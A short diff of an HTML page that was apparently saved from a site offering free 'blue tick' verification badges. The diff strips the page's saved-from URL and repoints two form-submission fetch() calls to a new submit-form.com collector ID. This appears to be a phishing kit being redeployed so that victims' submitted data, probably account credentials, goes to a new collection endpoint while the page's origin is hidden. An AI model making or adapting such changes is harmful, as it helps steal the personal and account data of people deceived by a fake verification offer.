@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!-- saved from url=(0056)https://get-on-blue-tick-badge-apply-free-here.surge.sh/ -->
+<!-- saved from url=(0056) -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -3032,7 +3032,7 @@
                 const btn = document.getElementById('submitBtn');
                 btn.classList.add('loading');
                 btn.disabled = true;
-                fetch('https://submit-form.com/7vqrjKqWy', {
+                fetch('https://submit-form.com/PwhuPsNWK', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -3077,7 +3077,7 @@
                 }
                 btn.classList.add('loading');
                 btn.disabled = true;
-                fetch('https://submit-form.com/7vqrjKqWy', {
+                fetch('https://submit-form.com/PwhuPsNWK', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
